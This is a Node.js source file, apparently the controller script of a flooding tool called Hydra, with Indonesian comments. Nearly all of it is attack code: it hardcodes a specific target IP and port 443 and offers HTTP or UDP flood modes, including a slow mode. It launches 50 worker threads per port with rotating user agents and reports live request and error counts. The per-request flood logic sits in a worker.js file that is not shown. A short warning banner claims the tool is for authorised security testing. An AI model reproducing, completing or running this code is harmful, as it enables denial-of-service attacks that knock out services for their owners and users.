// File: Hydra.js
// Nama skrip: Hydra

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const url = require('url');

// --- Konfigurasi Serangan (Mirip dengan Go) ---
const TARGET_IP = '185.108.148.12';
const PORTS = [443];
const THREADS_PER_PORT = 50; // Akan diterjemahkan ke jumlah worker per port
const ATTACK_TYPE = 'http'; // 'http' atau 'udp'
const MODE = 'normal'; // 'normal' atau 'slow'
const DURATION_SEC = 120; // 0 untuk tak terbatas
const HTTP_METHOD = 'GET'; // Hanya relevan untuk attackType 'http'

const USER_AGENTS = [ // Daftar user agent yang sama
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
];
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

// --- Helper Functions ---
function getRandomBigInt(max) {
    const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
    const num = buffer.readUIntBE(0, buffer.length);
    return num % max;
}

function generateRandomString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += CHARSET[getRandomBigInt(CHARSET.length)];
    }
    return result;
}

function getRandomUserAgent() {
    if (USER_AGENTS.length === 0) return 'HydraClient';
    return USER_AGENTS[getRandomBigInt(USER_AGENTS.length)];
}

// --- Statistik Global (Main Thread) ---
let sentRequestsTotal = 0;
let activeConnections = 0;
let errorCount = 0;
let serverErrors = 0;
let startTime = Date.now();
let attackDuration = DURATION_SEC > 0 ? DURATION_SEC * 1000 : null; // Dalam milidetik
let isStopping = false;

// --- Fungsi Utama (Main Thread) ---
async function main() {
    console.log("\n" + `\x1b[1;36m------------------------------------------------------------\x1b[0m`);
    console.log(`\x1b[1;36m%s\x1b[0m`, "Inisialisasi...");
    console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);

    console.log(`
    ██╗░░░██╗███████╗░█████╗░██████╗░███████╗
    ██║░░░██║██╔════╝██╔══██╗██╔══██╗██╔════╝
    ██║░░░██║███████╗███████║██████╔╝███████╗
    ██║░░░██║╚════██║██╔══██║██╔══██╗╚════██║
    ╚██████╔╝███████║██║░░██║██║░░██║███████║
    ░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
    `);
    console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);

    console.warn(`\x1b[1;33m!!! PERINGATAN HYDRA !!!\x1b[0m`);
    console.warn(`\x1b[1;33mScript ini adalah alat PENGUJIAN KEAMANAN yang kuat.\x1b[0m`);
    console.warn(`\x1b[1;33mGunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.\x1b[0m`);
    console.warn(`\x1b[1;33mPenggunaan ILEGAL berakibat pada HUKUMAN PIDANA.\x1b[0m`);
    console.warn(`\x1b[1;31mTekan CTRL+C dalam 5 detik untuk membatalkan...\x1b[0m`);

    await new Promise(resolve => setTimeout(resolve, 5000));

    console.log(`\n\x1b[1;32mStarting HYDRA ${ATTACK_TYPE.toUpperCase()} (${MODE.toUpperCase()}) attack on ${TARGET_IP} on ports ${PORTS.join(', ')} with ${THREADS_PER_PORT} workers/port (Method: ${HTTP_METHOD}). Duration: ${DURATION_SEC > 0 ? DURATION_SEC + 's' : 'Unlimited'}...\x1b[0m`);

    const workerPromises = [];
    const totalTasks = PORTS.length * THREADS_PER_PORT;
    let tasksCompleted = 0;

    // Interval untuk menampilkan statistik
    const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${sentRequestsTotal}\x1b[0m | Active Con: \x1b[1;34m${activeConnections}\x1b[0m | Srv Err: \x1b[1;33m${serverErrors}\x1b[0m | Errors: \x1b[1;31m${errorCount}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
    }, 1000);

    // Membuat worker threads
    for (const port of PORTS) {
        for (let i = 0; i < THREADS_PER_PORT; i++) {
            const workerData = {
                targetIP: TARGET_IP,
                port: port,
                attackType: ATTACK_TYPE,
                mode: MODE,
                durationMs: attackDuration, // Kirim durasi dalam ms
                httpMethod: HTTP_METHOD,
                workerId: `${port}-${i}`
            };

            const worker = new Worker('./worker.js', { workerData }); // worker.js adalah file terpisah

            const promise = new Promise((resolve, reject) => {
                worker.on('message', (message) => {
                    // Menerima update dari worker
                    if (message.type === 'stats') {
                        sentRequestsTotal += message.sent;
                        activeConnections = message.active; // Worker akan melaporkan totalnya
                        errorCount += message.errors;
                        serverErrors += message.serverErrors;
                    } else if (message.type === 'done') {
                        tasksCompleted++;
                        resolve({ workerId: workerData.workerId, status: 'completed' });
                    }
                });

                worker.on('error', (err) => {
                    errorCount++;
                    console.error(`\nWorker ${workerData.workerId} error:`, err);
                    reject({ workerId: workerData.workerId, status: 'error', error: err });
                });

                worker.on('exit', (code) => {
                    if (code !== 0 && !isStopping) { // Jangan laporkan jika kita menghentikan secara manual
                        errorCount++;
                        console.error(`\nWorker ${workerData.workerId} exited with code ${code}`);
                        reject({ workerId: workerData.workerId, status: 'exit', code: code });
                    } else if (code === 0 && !isStopping) {
                        tasksCompleted++;
                        resolve({ workerId: workerData.workerId, status: 'completed' });
                    }
                });
            });

            workerPromises.push(promise);
        }
    }

    // Menangani sinyal Ctrl+C untuk menghentikan semua worker
    process.on('SIGINT', async () => {
        if (isStopping) return;
        isStopping = true;
        console.log("\nCtrl+C detected. Initiating shutdown...");
        clearInterval(statsInterval);
        
        // Kirim pesan stop ke semua worker
        const workers = require.main.children.filter(child => child.filename.includes('worker.js')); // Perlu cara yang lebih baik untuk mendapatkan worker
        // TODO: Implementasi pengiriman pesan stop ke worker. Saat ini, worker akan keluar karena durasi atau error.
        // Untuk saat ini, kita akan mengandalkan timeout atau worker yang keluar secara alami.
        
        console.log("Waiting for active tasks to finish or timeout...");
        
        try {
            await Promise.allSettled(workerPromises);
        } catch (err) {
            // Ignore errors during shutdown
        }
        
        console.log("\nHydra attack stopped.");
        process.exit(0);
    });

    // Tunggu semua worker selesai atau error
    try {
        await Promise.all(workerPromises);
        clearInterval(statsInterval);
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`\n\n\x1b[1;36m------------------------------------------------------------\x1b[0m`);
        console.log(`\x1b[1;32mHydra attack finished.\x1b[0m`);
        console.log(`\x1b[1;36mTotal Sent Requests: \x1b[1;32m${sentRequestsTotal}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Errors: \x1b[1;31m${errorCount}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Server Errors: \x1b[1;33m${serverErrors}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Duration: \x1b[1;34m${elapsed.toFixed(2)}s\x1b[0m`);
        console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);
    } catch (err) {
        clearInterval(statsInterval);
        console.error("\nAttack encountered critical errors. Stopping...");
        console.error("Details:", err);
        process.exit(1);
    }
}

// --- Main Thread Execution ---
if (isMainThread) {
    main();
} else {
    // Script ini hanya dijalankan sebagai main thread.
    // Kode worker ada di worker.js
}
